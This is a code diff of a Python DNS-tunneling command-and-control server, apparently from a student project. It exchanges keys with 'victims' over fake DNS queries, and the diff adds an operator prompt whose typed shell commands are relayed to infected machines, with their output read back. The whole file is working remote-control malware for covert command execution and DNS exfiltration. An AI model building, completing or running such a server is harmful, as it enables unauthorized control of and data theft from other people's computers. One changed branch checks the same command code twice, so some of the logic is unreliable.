@@ -4,6 +4,7 @@ Naor Maman        207341777
 """
 import binascii
 import base64
+from threading import Thread
 
 import pyDH as pyDH
 from Crypto.Cipher import AES
@@ -17,16 +18,16 @@ DOMAIN = b".resh.gimel."
 MAX_CHARS_IN_SUBDOMAIN = 63
 FORWARD_IP = '8.8.8.8'
 MAX_DOMAIN = 255 - len(DOMAIN) - 10
-CLIENT_COMMANDS = {'keyExchange1': 101, 'keyExchange3': 103, 'ok&ans': 201, 'awake': 100, 'ok&retransmission': 202,
-                   'ok&more': 208, 'next&more': 209, 'last': 210, 'ok&continue': 222}
-
-SERVER_COMMANDS = {'keyExchange2': 102, 'ok&process': 200, 'ok&sleep': 299, 'error&retransmission': 400,
-                   'ok&continue': 222, 'more': 208, 'next': 209, 'last': 210}
+CLIENT_COMMANDS = {'keyExchange1': 101, 'keyExchange3': 103, 'ok&ans': 201, 'awake': 300, 'ok&retransmission': 401,
+                   'more': 501, 'next': 502, 'last': 503, 'ok&continue': 504}
+SERVER_COMMANDS = {'keyExchange2': 102, 'ok&process': 200, 'ok&sleep': 301, 'error&retransmission': 400,
+                   'more': 501, 'next': 502, 'last': 503, 'ok&continue': 504}
 stat_data = b''
 stat_code = 0
 connected_victims = {}  # keys: identifies victims' numbers,
 # values: to each: [shared key, encrypting object, decrypting object, os type]
 need_2_send: List[bytes] = []
+input_buffer = ""
 
 
 def listen_socket():
@@ -34,7 +35,6 @@ def listen_socket():
     this machine is the DNS nameserver,
     therefore, it's NOT listen in Known-DNS-port 53,
     so we open a socket in this port, in order to avoid the machine to send a ICMP port-unreachable
-
     :returns: UDP server listen socket
     """
     dns_udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -46,7 +46,6 @@ def attack(request: DNSQR):
     """
     Get a DNS request from victim with fake request that contains some data.
     parse the data, and act according to it.
-
     :param request: the DNS request query from victim.
     """
     global stat_code
@@ -66,12 +65,12 @@ def attack(request: DNSQR):
         print('ok&ans OR ok&retransmission')
         send_command(request, identify, cmd_code, enc_data)
 
-    elif cmd_code == CLIENT_COMMANDS['ok&more']:
-        print('ok&more')
+    elif cmd_code == CLIENT_COMMANDS['more']:
+        print('more')
         get_first_part(request, identify, enc_data)
 
-    elif cmd_code == CLIENT_COMMANDS['next&more']:
-        print('next&more')
+    elif cmd_code == CLIENT_COMMANDS['more']:
+        print('more')
         get_next_part(request, identify, enc_data)
 
     elif cmd_code == CLIENT_COMMANDS['last']:
@@ -92,7 +91,7 @@ def attack(request: DNSQR):
                 send_response(request, err_ans)
             else:
                 print('identify:', identify, ' | code:', stat_code, ' | all data:\n', data)
-                response_data = build_response(identify, SERVER_COMMANDS['ok&sleep'], b'20')
+                response_data = build_response(identify, SERVER_COMMANDS['ok&sleep'], b'5')
                 send_response(request, response_data)
                 # input("Enter next command to be sent to client: ")
 
@@ -113,27 +112,22 @@ def attack(request: DNSQR):
 def send_command(request: DNSQR, identify: bytes, ans_code: int, enc_data: bytes):
     """
     Send the next command to the victim
-
     :param request: the DNS request query from victim.
     :param identify: victim identify number
     :param ans_code: victim client code
     :param enc_data: victim encoded data
     """
+    global input_buffer
+
     data = decode_msg(identify, enc_data)
-    print('answer from ', identify, ' with code ', ans_code, ':\n', data)
-
-    # TODO: do real something
-    # response_data = build_response(identify, SERVER_COMMANDS['ok&process'], b'got your answer!')
-    # send_response(request, response_data)
-
-    response_data = build_response(identify, SERVER_COMMANDS['ok&sleep'], b'100')
-    send_response(request, response_data)
+    # print('answer from ', identify, ' with code ', ans_code, ':\n', data)
+    print(data)
+    send_next_command(request, identify)
 
 
 def send_next_part(request: DNSQR, identify: bytes):
     """
     Pop from the waiting list the server command's next part and send it to victim in a DNS response message.
-
     :param request: the DNS request query from victim.
     :param identify: victim identify number
     """
@@ -150,7 +144,6 @@ def get_first_part(request: DNSQR, identify: bytes, enc_data: bytes):
     """
     Get the first part of answer from victim,
     and send him an `ACK` that says that he can send the next part.
-
     :param request: the DNS request query from victim.
     :param identify:
     :param enc_data: victim encoded data
@@ -167,7 +160,6 @@ def get_next_part(request: DNSQR, identify: bytes, enc_data: bytes):
     """
     Get the next part of answer from victim,
     and send him an `ACK` that says that he can send the next part.
-
     :param request: the DNS request query from victim.
     :param identify:
     :param enc_data: victim encoded data
@@ -185,7 +177,6 @@ def key_exchange1(request: DNSQR, identify: bytes, bytes_victim_dh_pubkey: bytes
     Start key exchanging with the connected victim:
     generate the public & shared key, encrypting & decrypting functions.
     send the public key to victim.
-
     :param request: the DNSQR paket from victim
     :param identify: victim identify number
     :param bytes_victim_dh_pubkey: victim public key
@@ -209,7 +200,6 @@ def key_exchange3(request: DNSQR, identify: bytes, enc_victim_os: bytes):
     Finish key exchanging with the connected victim:
     save the victim os type,
     send him the next command to do.
-
     :param request: the DNSQR paket from victim
     :param identify: victim identify number
     :param enc_victim_os: victim os type
@@ -218,15 +208,27 @@ def key_exchange3(request: DNSQR, identify: bytes, enc_victim_os: bytes):
 
     connected_victims[identify].append(victim_os)
     print("[!] New victim is connected!")
+
     curr_vic = connected_victims[identify]
-    print(f"[!] His stats: {identify}, {curr_vic[0].decode(), curr_vic[-1]}")
+    print(f"[!] {identify} OS type: {curr_vic[-1]}")
+    send_next_command(request, identify)
 
-    response_data = build_response(identify, SERVER_COMMANDS['ok&process'], b'ip a')
+
+def send_next_command(request: DNSQR, identify: bytes):
+    """
+
+    :param request: the DNSQR paket from victim
+    :param identify: victim identify number
+    """
+    global input_buffer
+
+    if input_buffer != '':
+        response_data = build_response(identify, SERVER_COMMANDS['ok&process'], input_buffer.encode())
+        input_buffer = ''
+    else:
+        print("[!]send him to sleep!")
+        response_data = build_response(identify, SERVER_COMMANDS['ok&sleep'], b'5')
     send_response(request, response_data)
-
-    # print("[!]send him to sleep!")
-    # response_data = build_response(SERVER_COMMANDS['ok&sleep'], b'100')
-    # send_response(request, response_data)
 
 
 # endregion
@@ -234,10 +236,11 @@ def key_exchange3(request: DNSQR, identify: bytes, enc_victim_os: bytes):
 # endregion
 
 # region send & receive functions:
+
+
 def build_response(identify: bytes, cmd_code: int, cmd: bytes):
     """
     Build the next command for the victim.
-
     :param identify:
     :param cmd_code: the command code.
     :param cmd: the next command.
@@ -266,7 +269,6 @@ def send_response(request: DNSQR, fake_domain: bytes):
     """
     Send a DNS response.
     The data in the response is `fake_domain`.
-
     :param request: the sniffed DNS request
     :param fake_domain: the data to send to victim
     """
@@ -302,7 +304,6 @@ def send_response(request: DNSQR, fake_domain: bytes):
 def parse_request(request: DNSQR):
     """
     Parse from a given DNS `fake` request the identify of the victim, the data in base32 and it's code.
-
     :param request: a DNS request header.
     :return: the identify of the victim, data's code and the data itself
     """
@@ -359,7 +360,6 @@ def prn(pkt):
 def dns_request_filter(pkt) -> bool:
     """
     Filter only DNS request.
-
     :param pkt: the sniffed packet.
     :returns: if it mean the condition above.
     """
@@ -387,7 +387,6 @@ def run():
 def decode_msg(identify, encrypted_msg: bytes) -> str:
     """
     Get an encrypted message from server and decrypt it.
-
     :param identify: victim identify number
     :param encrypted_msg: the encrypted message
     :return: plain text message
@@ -402,5 +401,14 @@ def decode_msg(identify, encrypted_msg: bytes) -> str:
         return base32_msg.decode()
 
 
+def main():
+    global input_buffer
+    t1 = Thread(target=run)
+    t1.start()
+    while True:
+        if connected_victims:
+            input_buffer = input("enter the next command to perform:")
+
+
 if __name__ == "__main__":
-    run()
+    main()
